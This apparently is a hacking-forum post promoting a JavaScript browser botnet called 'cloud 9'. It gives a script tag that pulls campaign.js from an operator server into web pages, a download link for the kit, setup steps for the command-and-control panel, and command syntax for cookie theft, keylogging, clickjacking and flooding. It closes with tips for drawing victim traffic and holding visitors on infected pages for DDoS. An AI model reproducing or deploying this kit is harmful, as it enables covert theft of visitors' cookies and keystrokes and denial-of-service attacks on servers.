How to infect a page with cloud 9 botnet:-

<script src="http://yourserver.com/campaign.js"></script>









Hello again HF!

I created a javascript botnet that has the following features:
FTP flood
Cookie stealing
Keylogging
Send POST requests
Flood POST requests
Evaluate JavaScript Code
Silently load webpages
Clickjacking (iframe follow mouse)

The commands are:
Code 
cookie
clipboard
load*[url]*[millisecond delay]*
view*[url]*
sleep*[milliseconds]*
eval*[code]*
jack*[iframe]*[width]*[height]*
md5*[hash]*[brute length]*[brute alphabet]*
sha1*[hash]*[brute length]*[brute alphabet]*
post*[url]*[params]*
floodpost*[url]*[params]*[millisecond delay]*
The millisecond delay is the delay between requests when flooding.

Here is the download link to the botnet:
http :// browsersecurity.gq/cloud9-latest.zip

Unzip the folder on you server
Then edit campaign.js and set master to your servers IP
Edit admin/panel4829.php and set a new username and password for the cnc panel

One way of getting tons of browsers on your net use traffic exchange sites like hitleap.com or 10khits.com

To FTP flood use this command:
Code 
load*ftp://website.com:80/*0*
That command will exhaust all of the connections on a webserver with only a few browsers

All keylogs that are recorded are sent once the page is closed for stealth

To infect a page simply put this html on it:
http ://pastebin .com/eDRgnxN9

Then whoever visits the page will be on the botnet for as long as they are on the page.

I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)

Happy hacking!
